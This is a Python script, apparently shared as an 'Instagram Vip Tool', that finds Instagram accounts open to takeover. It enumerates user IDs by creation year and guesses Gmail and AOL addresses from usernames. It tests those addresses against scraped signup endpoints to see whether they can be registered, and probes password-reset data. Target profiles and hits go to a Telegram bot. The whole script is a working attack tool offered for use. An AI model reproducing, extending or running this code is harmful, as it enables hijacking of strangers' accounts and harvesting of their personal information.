...
expiry_time = datetime.strptime('2026-3-20 00:00:00.000',
                                '%Y-%m-%d %H:%M:%S.%f')
if current_time > expiry_time:
    print('Süresi doldu , by @oxychicana')
    exit(0)

sannytool = render('{Oxy}', colors=['green', 'white'], align='center')
print(f'''  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
                      {sannytool}
                    Instagram Vip Tool
                      ig : Oxychicana
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
 ...
 ____________
   ...
   [ 1 ] 𝐇𝐢𝐭 : [ {hits} ]
   [ 2 ] 𝐊𝐨𝐭𝐮 𝐞𝐦𝐚𝐢𝐥 : [ {bademail} ]
   [ 3 ] 𝐊𝐨𝐭𝐮 𝐈𝐧𝐬𝐭𝐚 :  [ {badinsta} ]
 ____________
...
{cyan}1{white} - {yellow}𝟮𝟬𝟭𝟭{green}    

{cyan}2{white} - {yellow}𝟮𝟬𝟭𝟮{green}    

{cyan}3{white} - {yellow}𝟮𝟬𝟭𝟯{green}    

{cyan}4{white} - {yellow}𝟮𝟬𝟭𝟰{green}    

{cyan}5{white} - {yellow}𝟮𝟬𝟭𝟱{green}    

{cyan}6{white} - {yellow}𝟮𝟬𝟭𝟲{green}    

{cyan}7{white} - {yellow}𝟮𝟬𝟭𝟳{green}    

{cyan}8{white} - {yellow}𝟮𝟬𝟭𝟴{green}    

{cyan}9{white} - {yellow}𝟮𝟬𝟭𝟵{green}    

{cyan}10{white} - {yellow}𝟮𝟬𝟭𝟭-𝟮𝟬𝟮𝟯{green}

{cyan}11{white} - {yellow}𝗠𝗘𝗧𝗔 {green}

{cyan}12{white} - {yellow}𝟮𝟬𝟭𝟬-𝟮𝟬𝟭𝟯{green}
""")
sanny = input(f"{green}-> {white}Seçimin: {reset}")
if sanny == '1':
    bbk = 10000
    id = 17699999
elif sanny == '2':
...
def tll():
    try:
        ...
        he3 = {
            _E: _G,
            _B: 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            _F: _M,
            _L: '1',
            _C: str(ggb())
        }
        ...
        headers = {
            ...
            _P: _d,
            _Q:
            'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            _C: ggb()
        }
        data = {
            'f.req':
            f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo':
            '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        ...
        host = response.cookies.get_dict()[_N]
        with open(_R, 'w') as f:
            f.write(f"{tl}//{host}\n")
...
def Getaol():
    try:
        qq = requests.get('https://login.aol.com/account/create',
                          headers={
                              _C: _e,
                              _B: _H
                          })
        ...
        cookies.update({
            ...
            'gpp_sid': '-1',
            '__gads':
            f"ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA",
            '__gpi':
            f"UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ",
            'cmp': f"t={tm1}&j=0&u=1---"
        })
        specData = qq.text.split(
            'name="attrSetIndex">\n        <input type="hidden" value="'
        )[1].split('" name="specData">')[0]
        specId = qq.text.split(
            'name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="'
        )[1].split('" name="specId">')[0]
        crumb = qq.text.split(
            'name="cacheStored">\n        <input type="hidden" value="'
        )[1].split('" name="crumb">')[0]
        sessionIndex = qq.text.split(
            '"acrumb">\n        <input type="hidden" value="')[1].split(
                '" name="sessionIndex">')[0]
        acrumb = qq.text.split(
            'name="crumb">\n        <input type="hidden" value="')[1].split(
                '" name="acrumb">')[0]
        try:
            os.remove(_I)
...
def check_gmail(email):
    ...
    try:
        ...
        headers = {
            ...
            _P: _d,
            _Q:
            f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            _C: ggb()
        }
        params = {'TL': tl}
...
def check_aol(email):
    ...
    try:
        ...
        try:
            with open(_I, 'r') as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip(
                    ).split('Π')
            with open(_J, 'r') as f:
                for line in f:
        ...
        headers = {
            ...
            _Q:
            f"https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com",
            'sec-ch-ua':
        ...
        res = requests.post('https://login.aol.com/account/module/create',
                            params=params,
                            headers=headers,
                            data=data,
...
def check(email):
    ...
    response = requests.post(_l, headers=headers, data=data).text
...
def rest(user):
    try:
        ...
        response = requests.post(_l, headers=headers, data=data).json()
        r = response['email']
    except:
        r = 'no REST !'
    return r
...
def date(hy):
    try:
        ranges = [(1279000, 2010), (17750000, 2011), (279760000, 2012),
                  (900990000, 2013), (1629010000, 2014), (2500000000, 2015),
                  (3713668786, 2016), (5699785217, 2017), (8597939245, 2018),
                  (21254029834, 2019), (43464475395, 2020),
                  (50289297647, 2021), (57464707082, 2022),
                  (63313426938, 2023)]
...
def InfoAcc(username, gg):
    ...
    Id = rr.get('pk', A)
    full_name = rr.get('full_name', A)
    fows = rr.get('follower_count', A)
    fowg = rr.get('following_count', A)
    pp = rr.get('media_count', A)
    isPraise = rr.get('is_private', A)
    bio = rr.get('biography', A)
    is_verified = rr.get('is_verified', A)
    bizz = rr.get('is_business', A)
    try:
        if fows and pp:
            if int(fows) >= 10 and int(pp) >= 5: meta = _D
            else: meta = B
        else: meta = B
    except:
        meta = B
...
𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 ➟ 🌹 @{username}
𝐓𝐚𝐤𝐢𝐩𝐜𝐢 ➟ 🌷 {fows}
𝗧𝗮𝗸𝗶𝗽 𝗘ᴛᴛɪ𝗸𝗹𝗲𝗿𝗶 ➟ 🌜 {fowg}
𝗧ᴏ𝗽ʟ𝗮𝗺 𝗚ö𝗻𝗱𝗲𝗿𝗶 ➟ 🚨 {pp}
𝗕𝗶𝗼𝗴ʀ𝗮𝗳𝗶 ➟ 💢 {bio}
𝗘-𝗣𝗼𝘀𝘁𝗮 ➟ 🕊️ {username}@{gg}
𝐑𝐞𝐬𝐞𝐭 ➟ 💸 {rest(username)}
𝗨𝗿𝗹 ➟ 🔱 (https://www.instagram.com/{username})
𝗠𝗲𝘁𝗮  ➟ ⚙️ {meta}
𝗚𝗶𝘇𝗹𝗶 ➟ ⚙️ {isPraise} 
...
"""
    ...
    try:
        try:
            requests.get(
                f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ss}"
            )
        except:
            pass
    except Exception as e:
...
def gg():
    ...
    while _D:
        ...
        response = requests.post('https://www.instagram.com/api/graphql',
                                 headers={'X-FB-LSD': data[A]},
                                 data=data)
        try:
            username = response.json().get(B, {}).get(C, {}).get('username')
            infoinsta[username] = response.json().get(B, {}).get(C, {})
            emails = [username + _S, username + _U]
            for email in emails:
                check(email)
        except:
            ''
